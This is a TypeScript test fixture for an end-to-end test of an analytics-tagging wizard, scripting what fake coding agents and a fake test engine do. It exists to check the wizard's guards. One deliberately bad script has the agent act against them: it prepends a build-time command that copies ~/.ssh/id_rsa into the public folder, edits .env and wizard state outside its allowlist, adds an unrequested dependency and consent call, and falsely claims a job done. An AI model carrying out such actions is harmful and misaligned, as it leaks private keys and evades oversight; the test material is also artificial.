import vm from "node:vm"
import { sensitivePosthogOptions } from "../../src/install/posthog-sensitive.js"
import { META_PAGE_CHANGE_SCRIPT } from "../../src/jobs/briefs.js"
import { REVIEW_ITEMS } from "../../src/wizard/contracts/agents.js"
// The offline E2E's scripted world (§4.3; test-only, never published): what the fake agents do each turn,
// what the fake desktop's test engine "sees", and the answers file. Every edit is computed from the fixture
// site's own bytes, so a fixture change cannot silently turn an edit into a no-op.
import { readFileSync } from "node:fs"
import { join } from "node:path"

import { loadTestRunCases, fixtureResponse } from "./fake-bridge.js"
import { FIXTURE_PIXEL_ID, FIXTURE_SITE, PLANTED_DOTENV_VALUE, PRODUCTION_HOST } from "./e2e-harness.js"
import { buildHostGuardExpression, wrapGuardedSnippet } from "../../src/host-guard.js"
import { GA4_SILENCED_STUB } from "../../src/providers/ga4.js"
import { META_SILENCED_STUB } from "../../src/providers/meta.js"
import { escapeForTemplateLiteral } from "../../src/text-escape.js"
import type { TagHosting } from "../../src/wizard/contracts/bridge.js"
import type { TestResult, TestRunRequest } from "../../src/wizard/contracts/test-engine.js"

export const CONVERSION = "sign_up"

/** The item ids the registry seeds for the fixture site (asserted by the E2E: a drift fails loudly). */
export const ITEMS = {
  duplicates: "duplicates_remove:ga4_config:G-FAKE00001",
  setupFix: "setup_check_fixes:provider_census",
  identify: "identify_reset:auth",
  serverConversion: "server_conversions:signup",
  conversionsToTools: "conversions_to_tools:signup",
  posthogProxy: "posthog_improve:proxy",
  posthogHistory: "posthog_improve:history_change",
  posthogDefaults: "posthog_improve:defaults",
  guardGa4: "preview_guard:ga4",
  guardMeta: "preview_guard:meta",
  guardPosthog: "preview_guard:posthog",
  posthogSensitive: "posthog_improve:sensitive_pages",
  metaSpa: "meta_improve:spa_page_view"
} as const

export const REVIEW_FINDING_ID = "F1"
export const FIX_ITEM = `review_comments:${REVIEW_FINDING_ID}`

export function fixtureFile(rel: string): string {
  return readFileSync(join(FIXTURE_SITE, rel), "utf8")
}

// ---- the worker's edits (Claude Code, jobs round 1), as Edits on the files as they are THEN ----

type Step = Record<string, unknown>

/** One in-place Edit (the fake replaces exactly one occurrence, or the last one). */
export function replaceStep(path: string, find: string, replace: string, occurrence?: "last"): Step {
  return { replace: { path, find, replace, ...(occurrence ? { occurrence } : {}) } }
}

function mustHold(rel: string, ...texts: string[]): void {
  const file = fixtureFile(rel)
  for (const text of texts) if (!file.includes(text)) throw new Error(`e2e scenario: fixture ${rel} lost ${JSON.stringify(text.slice(0, 60))}`)
}

export const GTAG_LOADER = '        <Script src="https://www.googletagmanager.com/gtag/js?id=G-FAKE00001" strategy="afterInteractive" />\n'
export const GA4_AGAIN = "        <Script id=\"ga4-again\" strategy=\"afterInteractive\">\n          {`gtag('config', 'G-FAKE00001');`}\n        </Script>\n"

/** Job 6: drop the second gtag loader and the second `config` for the same id (one init per id). */
export function duplicateRemovalSteps(): Step[] {
  mustHold("app/layout.tsx", GTAG_LOADER, GA4_AGAIN)
  return [replaceStep("app/layout.tsx", GTAG_LOADER, "", "last"), replaceStep("app/layout.tsx", GA4_AGAIN, "")]
}

const LOGIN_IMPORT = 'import { supabase } from "../../../../lib/supabase"\n'
/** Job 9: identify after a verified login, reset on logout. */
export function identifyResetSteps(): Step[] {
  mustHold("app/api/auth/login/route.ts", LOGIN_IMPORT)
  return [
    replaceStep("app/api/auth/login/route.ts", LOGIN_IMPORT, `${LOGIN_IMPORT}import { infiniteIdentify } from "../../../../lib/infinite-analytics"\n`),
    replaceStep("app/api/auth/login/route.ts", "  return Response.json({ ok: true, accountId: data.user.id })", "  infiniteIdentify(data.user.id)\n  return Response.json({ ok: true, accountId: data.user.id })"),
    replaceStep("app/api/auth/logout/route.ts", LOGIN_IMPORT, `${LOGIN_IMPORT}import { infiniteReset } from "../../../../lib/infinite-analytics"\n`),
    replaceStep("app/api/auth/logout/route.ts", "  await supabase.auth.signOut()\n", "  await supabase.auth.signOut()\n  infiniteReset()\n")
  ]
}

const SIGNUP_IMPORT = 'import { supabase } from "../../../lib/supabase"\n'
const SIGNUP_CALL = "  const { data, error } = await supabase.auth.signUp({ email, password })\n"
// Review r3: Meta is connected, so the sign_up carries the match data (adMatch), built from the visitor's own request.
// Finding 1: the page sends the tag's signal in its JSON body and the route reads that same key from the body.
const MATCH = "adMatch: await adMatchFromRequest(request, { trackingAllowed: adMatch === true, email })"
const SIGNUP_BODY = "  const { email, password } = (await request.json()) as { email: string; password: string }\n"
const SIGNUP_FETCH = '    const response = await fetch("/api/signup", { method: "POST", body: JSON.stringify(Object.fromEntries(form)) })\n'
export const EARLY_REPORT = `  await reportInfiniteOutcome({ type: "sign_up", path: "/api/signup", eventId: data.user?.id ?? "unknown", ${MATCH} })\n`
const SIGNUP_RETURN = "  return Response.json({ ok: true, accountId: data.user.id })"
export const LATE_REPORT = `  await reportInfiniteOutcome({ type: "sign_up", path: "/api/signup", eventId: data.user.id, ${MATCH} })\n`

/** Job 8: report the signup outcome, deliberately BEFORE the error check (the reviewer flags it). */
export function serverConversionSteps(): Step[] {
  mustHold("app/api/signup/route.ts", SIGNUP_IMPORT, SIGNUP_CALL, SIGNUP_RETURN, SIGNUP_BODY)
  mustHold("app/signup/page.tsx", SIGNUP_FETCH, "export default function Signup()")
  return [
    replaceStep("app/api/signup/route.ts", SIGNUP_IMPORT, `${SIGNUP_IMPORT}import { adMatchFromRequest, reportInfiniteOutcome } from "../../../lib/infinite-server-lane"\n`),
    replaceStep("app/api/signup/route.ts", SIGNUP_BODY, "  const { email, password, adMatch } = (await request.json()) as { email: string; password: string; adMatch?: boolean }\n"),
    replaceStep("app/api/signup/route.ts", SIGNUP_CALL, `${SIGNUP_CALL}${EARLY_REPORT}`),
    replaceStep("app/signup/page.tsx", "export default function Signup()", 'import { infiniteAdMatchAllowed } from "../../lib/infinite-analytics"\n\nexport default function Signup()'),
    replaceStep("app/signup/page.tsx", SIGNUP_FETCH, '    const response = await fetch("/api/signup", { method: "POST", body: JSON.stringify({ ...Object.fromEntries(form), adMatch: infiniteAdMatchAllowed() }) })\n')
  ]
}
/** The review fix (job 16): the outcome after the success branch, with the account id. */
export function reviewFixSteps(): Step[] {
  return [replaceStep("app/api/signup/route.ts", EARLY_REPORT, ""), replaceStep("app/api/signup/route.ts", SIGNUP_RETURN, `${LATE_REPORT}${SIGNUP_RETURN}`)]
}
/** The line the reviewer comments on (1-based, in the PR head's signup route). */
export const SIGNUP_REPORT_LINE = (() => {
  const lines = fixtureFile("app/api/signup/route.ts").split("\n")
  const call = lines.findIndex((line) => line.includes("supabase.auth.signUp("))
  // +1 for the added import line, +1 to step past the call, +1 for 1-based numbering.
  return call + 3
})()

const SIGNUP_SUCCESS = '    if (response.ok) window.location.assign("/")\n'
/** The import the job's brief names (`helperImport`, DECISIONS §1.3): the managed module's helpers. */
export const SIGNUP_HELPER_IMPORT = 'import { infiniteTrack } from "../../lib/infinite-analytics"\n'
/**
 * Job 10 (DECISIONS §1.3): the signup is tracked in the form's success branch, right after `response.ok` and before
 * the navigation; never on the link that leads to the form (the runtime already records that click as intent).
 */
export function conversionSteps(): Step[] {
  mustHold("app/signup/page.tsx", '"use client"\n', SIGNUP_SUCCESS)
  return [
    replaceStep("app/signup/page.tsx", '"use client"\n', `"use client"\n\n${SIGNUP_HELPER_IMPORT}`),
    replaceStep("app/signup/page.tsx", SIGNUP_SUCCESS, `    if (response.ok) {\n      infiniteTrack("${CONVERSION}")\n      window.location.assign("/")\n    }\n`)
  ]
}
export const CONSENT_LINE = "    window.gtag?.('consent', 'update', { ad_user_data: 'granted' })\n"
/** NEVER the agent's job: a consent call (the fence reverts the hunk and blocks the job `consent_touched`). */
export function consentSteps(): Step[] {
  mustHold("app/signup/page.tsx", "    event.preventDefault()\n")
  return [replaceStep("app/signup/page.tsx", "    event.preventDefault()\n", `    event.preventDefault()\n${CONSENT_LINE}`)]
}

/** Job 3: PostHog through /ingest, plus a `child_process` reach in next.config.mjs (the post-turn gate). */
export function posthogProxySteps(): Step[] {
  mustHold("app/providers.tsx", 'api_host: "https://us.i.posthog.com"')
  return [
    replaceStep("app/providers.tsx", 'api_host: "https://us.i.posthog.com"', 'api_host: "/ingest", ui_host: "https://us.posthog.com"'),
    { prepend: { path: "next.config.mjs", text: NEXT_CONFIG_PREPEND } }
  ]
}
export const NEXT_CONFIG_CHILD_PROCESS_LINE = 'const { execSync } = require("child_process")'
/** Prepended to the installer's managed next.config.mjs: a build-time shell-out (refused by the post-turn gate). */
export const NEXT_CONFIG_PREPEND = `${NEXT_CONFIG_CHILD_PROCESS_LINE}\nexecSync("cat ~/.ssh/id_rsa > public/k.txt")\n`

/** What the worker writes OUTSIDE every allowlist (each must be reverted). */
export const OUTSIDE_EDITS = {
  readme: "# Acme Store\n\nEdited by the agent (outside its allowlist).\n",
  env: `SUPABASE_SERVICE_ROLE=${PLANTED_DOTENV_VALUE}\nNEXT_PUBLIC_SITE_NAME=acme\nAGENT_WAS_HERE=1\n`,
  state: '{"schema":"infinite-tag.wizard-state.v1","note":"the agent rewrote the wizard state"}\n'
}

// ---- the agents' scripts ----

const claim = (jobId: string, status: "done" | "blocked" | "not_needed", note: string, files?: string[]): Step => ({
  tool: "job_claim",
  args: { job_id: jobId, status, note, ...(files ? { files } : {}) }
})

/** Claude Code's first jobs turn (every §4.3 outcome 5–7 edit). */
export function workerRound1(): Step[] {
  return [
    { tool: "job_list" },
    ...duplicateRemovalSteps(),
    ...identifyResetSteps(),
    ...serverConversionSteps(),
    ...conversionSteps(),
    ...consentSteps(),
    ...posthogProxySteps(),
    { edit: { path: "README.md", content: OUTSIDE_EDITS.readme } },
    { edit: { path: ".env", content: OUTSIDE_EDITS.env } },
    replaceStep("package.json", '"posthog-js": "1.200.0",', '"posthog-js": "1.200.0",\n    "left-pad": "1.3.0",'),
    { edit: { path: ".infinite/wizard/state.json", content: OUTSIDE_EDITS.state } },
    { tool: "report_progress", args: { job_id: ITEMS.duplicates, text: "Removed the second GA4 config" } },
    claim(ITEMS.duplicates, "done", "Kept one gtag loader and one config for G-FAKE00001."),
    claim(ITEMS.setupFix, "done", "The duplicate GA4 init is gone."),
    claim(ITEMS.identify, "done", "infiniteIdentify after a verified login, infiniteReset on logout."),
    claim(ITEMS.serverConversion, "done", "reportInfiniteOutcome on signup."),
    claim(ITEMS.conversionsToTools, "done", "infiniteTrack in the signup success branch, before the navigation."),
    claim(ITEMS.posthogProxy, "done", "PostHog now sends through /ingest; rewrite added."),
    claim(ITEMS.posthogDefaults, "done", "Tidied the repo too.", ["README.md", ".env", "package.json", ".infinite/wizard/state.json"]),
    // A claim with no work behind it: the wizard's own check fails, so it is never ticked.
    claim(ITEMS.guardPosthog, "done", "PostHog is guarded."),
    claim(ITEMS.guardGa4, "blocked", "Needs a human: the GA4 init is shared."),
    claim(ITEMS.guardMeta, "blocked", "Needs a human: the pixel bootstrap is shared."),
    claim(ITEMS.posthogHistory, "blocked", "Needs a human.")
  ]
}

export interface AgentScenarioOptions {
  /** Claude turns played BEFORE the normal ones (variant a: the turn that hits the usage limit). */
  prefixTurns?: unknown[]
  /** Replace Claude's first jobs turn (variant a: a usage limit). */
  round1?: Step[] | { replay: string; steps?: Step[] }
}

/** The whole agents' scenario: Claude works (4 jobs rounds + 1 fix round), Codex reviews (2 reviews). */
export function agentScenario(options: AgentScenarioOptions = {}): unknown {
  const round1 = options.round1 ?? workerRound1()
  // Claude's result carries two permission denials (its Read of the repo's .env and of the app's session
  // file), as the real CLI reports them in `result.permission_denials`.
  const firstTurn = Array.isArray(round1)
    ? { steps: round1, denials: [".env", "/Users/someone/.growth-os/auth.json"] }
    : { steps: [...(round1.steps ?? []), { replay: round1.replay }], result: null, exit: 1 }
  const quiet = { steps: [{ tool: "job_list" }] }
  return {
    claude: {
      turns: [
        ...(options.prefixTurns ?? []),
        firstTurn,
        quiet,
        quiet,
        quiet,
        // The review fix round (job 16): the outcome after the success branch.
        { steps: [{ tool: "job_list" }, ...reviewFixSteps(), claim(FIX_ITEM, "done", "Moved the outcome after the success branch.")] }
      ]
    },
    codex: {
      turns: [
        { final: firstReview() },
        { final: { verdict: "looks_good", summary: "The fix is right.", checklist: REVIEW_ITEMS.map(item => ({ item, status: "pass", note: "Read and checked this fixture." })), findings: [] } }
      ]
    }
  }
}

/** A successful worker writes every approved fix; the safety-failure script above stays a negative world. */
type CompleteWorkerOptions = { productionHosts?: string[]; posthog?: boolean }

export function completeWorkerSteps(correctServerOutcome = false, options: CompleteWorkerOptions = {}): Step[] {
  const hosting = fixtureHosting().vercel!
  const guard = { mode: "deny" as const, exempt: options.productionHosts ?? [...new Set([PRODUCTION_HOST, `www.${PRODUCTION_HOST}`, ...hosting.productionDomains, ...hosting.productionAliases])], deny: [] }
  const expression = buildHostGuardExpression(guard)
  const ga4 = "window.dataLayer = window.dataLayer || [];\nfunction gtag(){dataLayer.push(arguments);}\ngtag('js', new Date());\ngtag('config', 'G-FAKE00001');"
  const loader = 'var script = document.createElement("script"); script.async = true; script.src = "https://www.googletagmanager.com/gtag/js?id=G-FAKE00001"; document.head.appendChild(script);'
  const ga4Guard = wrapGuardedSnippet(`${ga4}\nwindow.gtag = gtag;\n${loader}`, guard, GA4_SILENCED_STUB)
  const metaOpen = escapeForTemplateLiteral(`(function () { if (!(${expression})) { ${META_SILENCED_STUB} return; }\n`)
  const rewrites = [
    '{ source: "/ingest/static/:path(.*)", destination: "https://us-assets.i.posthog.com/static/:path" },',
    '{ source: "/ingest/array/:path(.*)", destination: "https://us-assets.i.posthog.com/array/:path" },',
    '{ source: "/ingest/:path(.*)", destination: "https://us.i.posthog.com/:path" },'
  ].map(line => `      ${line}`).join("\n")
  return [
    { tool: "job_list" },
    ...duplicateRemovalSteps(), claim(ITEMS.duplicates, "done", "Removed exactly the duplicate loader and config."),
    ...identifyResetSteps(), claim(ITEMS.identify, "done", "Identify after login success and reset after logout."),
    ...serverConversionSteps(), ...(correctServerOutcome ? reviewFixSteps() : []), claim(ITEMS.serverConversion, "done", "Added the server outcome; review its success boundary."),
    ...conversionSteps(), claim(ITEMS.conversionsToTools, "done", "Track sign_up after response.ok and before navigation."),
    replaceStep("app/layout.tsx", GTAG_LOADER, ""),
    replaceStep("app/layout.tsx", ga4, escapeForTemplateLiteral(ga4Guard)), claim(ITEMS.guardGa4, "done", "Guarded both the remaining GA4 loader and config."),
    replaceStep("app/layout.tsx", "!function(f,b,e,v,n,t,s)", `${metaOpen}!function(f,b,e,v,n,t,s)`),
    replaceStep("app/layout.tsx", "fbq('track', 'PageView');", `fbq('track', 'PageView');\n${escapeForTemplateLiteral(META_PAGE_CHANGE_SCRIPT)}\n})();`), claim(ITEMS.guardMeta, "done", "Wrapped the pixel bootstrap only; managed click-id capture stays outside."),
    claim(ITEMS.metaSpa, "done", "Installed the supplied page-change subscription after the initial page view."),
    ...(options.posthog === false ? [] : [
      replaceStep("app/providers.tsx", 'api_host: "https://us.i.posthog.com"', 'api_host: "/ingest", ui_host: "https://us.posthog.com"'),
      replaceStep("next.config.mjs", "    return [\n", `    return [\n${rewrites}\n`), claim(ITEMS.posthogProxy, "done", "Added /ingest and all three exact proxy rewrites, preserving the Infinite rewrite."),
      replaceStep("app/providers.tsx", 'ui_host: "https://us.posthog.com"', 'ui_host: "https://us.posthog.com", capture_pageview: "history_change"'), claim(ITEMS.posthogHistory, "done", "Enabled native history-change page views."),
      replaceStep("app/providers.tsx", 'capture_pageview: "history_change"', 'capture_pageview: "history_change", defaults: "2026-01-30"'), claim(ITEMS.posthogDefaults, "done", "Applied the approved defaults date."),
      replaceStep("app/providers.tsx", 'defaults: "2026-01-30"', `defaults: "2026-01-30", ${sensitivePosthogOptions(undefined, ["/login"])}`), claim(ITEMS.posthogSensitive, "done", "Turned replay and autocapture off only on the approved /login path and descendants."),
      replaceStep("app/providers.tsx", "    posthog.init(", `    if (${expression}) posthog.init(`), claim(ITEMS.guardPosthog, "done", "Guarded the actual PostHog initialization with the prescribed host expression.")
    ])
  ]
}

export function completeAgentScenario(options: Pick<AgentScenarioOptions, "prefixTurns"> & CompleteWorkerOptions & { correctServerOutcome?: boolean } = {}): unknown {
  return {
    claude: { turns: [
      ...(options.prefixTurns ?? []),
      { steps: completeWorkerSteps(options.correctServerOutcome, options) },
      { steps: [{ tool: "job_list" }, ...reviewFixSteps(), claim(FIX_ITEM, "done", "Moved the outcome after the success branch.")] }
    ] },
    codex: { turns: [
      { final: firstReview() },
      { final: { verdict: "looks_good", summary: "The server outcome now follows success.", checklist: REVIEW_ITEMS.map(item => ({ item, status: "pass", note: "Read and checked this fixture." })), findings: [] } }
    ] }
  }
}

/** A fresh site with no server lane must not ask the fake agent to write an unavailable server outcome. */
export function agentScenarioWithoutServerOutcome(options: CompleteWorkerOptions = {}): unknown {
  const scenario = structuredClone(completeAgentScenario(options)) as {
    claude: { turns: Array<{ steps?: Step[] }> }
    codex: { turns: Array<{ final?: unknown }> }
  }
  scenario.claude.turns[0]!.steps = scenario.claude.turns[0]!.steps!.filter((step) => {
    const replace = step.replace as { path?: string } | undefined
    const args = step.args as { job_id?: string } | undefined
    return replace?.path !== "app/api/signup/route.ts" && args?.job_id !== ITEMS.serverConversion
  })
  scenario.codex.turns[0]!.final = { verdict: "looks_good", summary: "No server outcome was requested without a server lane.", checklist: [], findings: [] }
  return scenario
}

/** The second agent's review: one real finding whose text carries a planted secret AND the Meta pixel id. */
export function firstReview(): unknown {
  return {
    verdict: "changes_suggested",
    summary: `One fix. The site's server env holds ${PLANTED_DOTENV_VALUE}; it is not in the diff. Meta pixel ${FIXTURE_PIXEL_ID} matches the connection.`,
    checklist: [
      ...REVIEW_ITEMS.filter(item => item !== "R8").map(item => ({ item, status: "pass", note: "Read and checked this fixture." })),
      { item: "R8", status: "fail", note: "The signup outcome is reported before the error check." }
    ],
    findings: [
      {
        id: REVIEW_FINDING_ID,
        item: "R8",
        severity: "should",
        path: "app/api/signup/route.ts",
        line: SIGNUP_REPORT_LINE,
        body: `reportInfiniteOutcome runs before the error check, so a failed signup counts. (Server env value ${PLANTED_DOTENV_VALUE}; pixel ${FIXTURE_PIXEL_ID} is right.)`,
        suggested_fix: "Report the outcome after the success branch, with the account id."
      }
    ]
  }
}

// ---- the fake desktop's test engine ----

function fixtureResult(id: string): TestResult {
  const found = loadTestRunCases().find((entry) => (entry as unknown as { id: string }).id === id)
  if (!found) throw new Error(`no test-run fixture ${id}`)
  return structuredClone(found.result)
}

/** What each desktop test "sees" on this site: production today (a duplicate GA4), the rehearsal, the preview, the real visit. */
export function testResultFor(request: TestRunRequest): TestResult | undefined {
  if (request.mode === "dry_live" && request.targets[0]?.label === "preview_self") {
    // The preview's own URL: every guarded tool is silent there.
    const silent = fixtureResult("dry_live_all_once")
    silent.loads = [{ label: "preview_self", url: request.targets[0].url, finalUrl: request.targets[0].url, status: 200, rendered: true, managedMarkerSeen: true, redirects: [] }]
    silent.ga4.events = []
    silent.posthog.events = []
    silent.meta.tr = []
    silent.meta.configRequests = []
    silent.infinite.events = []
    silent.markers = { infiniteEventIds: [], posthogDistinctId: null, metaEventIds: [] }
    return silent
  }
  if (request.mode === "dry_live") return fixtureResult("dry_live_ga4_two_page_views")
  if (request.mode === "rehearsal") return fixtureResult("rehearsal_click_test")
  if (request.mode === "real_visit") return fixtureResult("real_visit_delivering")
  return undefined
}

/** The correctly scripted worker's browser includes its one navigation PageView. */
export function correctWorkerResultFor(request: TestRunRequest): TestResult | undefined {
  const result = testResultFor(request)
  if (result && request.mode !== "dry_live") {
    const first = result.meta.tr.find(event => event.ev === "PageView" && !event.afterNav)
    if (first && !result.meta.tr.some(event => event.ev === "PageView" && event.afterNav)) {
      const emitted: string[] = []
      const location = { pathname: "/", search: "" }
      const history = { pushState(_state: unknown, _title: string, path: string) { location.pathname = path }, replaceState(_state: unknown, _title: string, path: string) { location.pathname = path } }
      const window = { fbq(_command: string, event: string) { emitted.push(event) }, addEventListener() {} }
      vm.runInNewContext(META_PAGE_CHANGE_SCRIPT, { window, location, history })
      if (emitted.length !== 0) throw new Error("The Meta subscription sent a duplicate initial PageView")
      history.pushState(null, "", "/next")
      history.replaceState(null, "", "/next")
      if (Number(emitted.length) !== 1 || emitted[0] !== "PageView") throw new Error("The emitted Meta subscription did not send exactly one PageView for a changed page")
      for (const ev of emitted) result.meta.tr.push({ ...first, ev, afterNav: true })
    }
  }
  return result
}

/** The fixture site's hosting: a single-app Vercel project (no monorepo root) with no env-sourced ids. */
export function fixtureHosting(): Omit<TagHosting, never> {
  const hosting = fixtureResponse("hosting") as unknown as TagHosting & { protocolVersion?: number; requestId?: string }
  delete hosting.protocolVersion
  delete hosting.requestId
  if (!hosting.vercel) throw new Error("hosting fixture without vercel")
  hosting.vercel.rootDirectory = null
  // This world's agent scenario writes a server outcome: the lane must really be installable here.
  hosting.vercel.envWriteGranted = true
  hosting.vercel.envTargets = {}
  return hosting
}

/** The answers file: consent, the conversion name, every line approved except the Meta relay; the GA4 stream. */
export function answersFile(extra: Record<string, unknown> = {}): Record<string, unknown> {
  return {
    v: 1,
    consentMode: "not_required",
    conversionNames: [CONVERSION],
    privacyText: false,
    plan: {
      approved: [
        "install_provider:infinite",
        "server_lane",
        "account_settings:ga4",
        "account_settings:hosting",
        "improve_additive:posthog:proxy",
        "improve_additive:posthog:history_change",
        "posthog_defaults_bump_adopted:posthog:defaults",
        "preview_guard_adopted:posthog:init",
        "preview_guard_adopted:ga4:init",
        "remove_duplicate:ga4:ga4_config:G-FAKE00001",
        "preview_guard_adopted:meta:meta",
        "meta_relay",
        "agent_budget"
      ],
      declined: []
    },
    asks: [{ kind: "single", match: "GA4", answer: "G-FAKE00001" }],
    ...extra
  }
}

/** Positive worlds accept the default plan without hiding unfinished jobs. */
export function completeAnswersFile(extra: Record<string, unknown> = {}): Record<string, unknown> {
  return answersFile(extra)
}

/** The Claude turn that hits its usage limit after editing (variant a): the real CLI's `rate_limit_event rejected`. */
export function usageLimitTurn(): unknown {
  return { steps: [{ tool: "job_list" }, ...duplicateRemovalSteps(), { replay: "claude-rate-limit-rejected.jsonl" }], result: null, exit: 1 }
}

/** Codex as the WORKER (variant g): it claims job 6 over MCP (after its tool_search_call) and in its -o file. */
export function codexWorkerScenario(): unknown {
  const done = { job_id: ITEMS.duplicates, status: "done", note: "Kept one gtag loader and one config for G-FAKE00001." }
  return {
    codex: {
      turns: [
        { steps: [{ tool: "job_list" }, ...duplicateRemovalSteps(), { tool: "job_claim", args: done }], final: { claims: [done], questions: [] } },
        { steps: [{ tool: "job_list" }], final: { claims: [], questions: [] } }
      ]
    },
    claude: {
      turns: [{ structured: { verdict: "looks_good", summary: "One init per tool now.", checklist: REVIEW_ITEMS.map(item => ({ item, status: "pass", note: "Read and checked this fixture." })), findings: [] } }]
    }
  }
}

/** The alternate worker performs the same real approved edits, with the server outcome correct initially. */
export function completeCodexWorkerScenario(): unknown {
  return {
    codex: { turns: [{ steps: completeWorkerSteps(true), final: { claims: [], questions: [] } }] },
    claude: { turns: [{ structured: { verdict: "looks_good", summary: "The approved edits are in the code.", checklist: REVIEW_ITEMS.map(item => ({ item, status: "pass", note: "Read and checked this fixture." })), findings: [] } }] }
  }
}
